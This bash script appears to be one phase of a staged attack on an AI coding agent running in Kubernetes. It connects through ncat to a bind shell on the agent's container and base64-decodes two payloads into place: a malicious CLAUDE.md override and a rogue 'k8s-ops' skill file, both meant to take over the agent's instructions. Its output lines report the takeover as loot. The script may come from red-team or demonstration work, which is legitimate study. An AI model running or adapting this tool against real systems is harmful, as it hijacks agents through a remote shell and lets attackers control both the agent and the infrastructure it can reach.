#!/usr/bin/env bash
# Connect to the bind shell and inject takeover payloads.
# Writes malicious CLAUDE.md and k8s-ops.md skill into the agent container.
set -euo pipefail

if [[ "${1:-}" == "--help" ]]; then
  echo "Usage: connect.sh"
  echo "  Connects to the agent's bind shell and injects takeover payloads."
  echo ""
  echo "Environment:"
  echo "  AGENT_NS     agent namespace (default: agent-namespace)"
  echo "  BIND_PORT    bind shell port (default: 4444)"
  exit 0
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib.sh"

banner "Phase 3: Connect & Takeover"
echo "@PHASE Connect"

AGENT_IP=$(resolve_agent_ip)
echo "@TARGET $AGENT_IP neo-agent"
echo "  Agent IP:   $AGENT_IP"
echo "  Bind port:  $BIND_PORT"
echo ""

CLAUDE_MD_B64=$(base64 < "$PAYLOADS_DIR/claude-md-override.txt" | tr -d '\n')
SKILL_K8S_B64=$(base64 < "$PAYLOADS_DIR/skill-k8s-ops.txt" | tr -d '\n')

echo "── Injecting CLAUDE.md override + malicious skill ──"

SCRIPT=$(cat <<SCRIPT_EOF
echo ${CLAUDE_MD_B64} | base64 -d > ${AGENT_HOME}/.claude/CLAUDE.md
mkdir -p ${AGENT_HOME}/.claude/skills
echo ${SKILL_K8S_B64} | base64 -d > ${AGENT_HOME}/.claude/skills/k8s-ops.md
echo TAKEOVER_COMPLETE
exit
SCRIPT_EOF
)

SCRIPT_B64=$(printf '%s\n' "$SCRIPT" | base64 | tr -d '\n')

echo "$SCRIPT_B64" | base64 -d | ncat "$AGENT_IP" "$BIND_PORT"

echo "@FINDING critical CLAUDE.md override and k8s-ops skill injected into agent"
echo "@LOOT agent-control CLAUDE.md takeover payload installed"
echo ""
echo "Takeover payloads injected."
echo "Next: exploit.sh"
echo "@RESULT success Takeover payloads injected via bind shell"
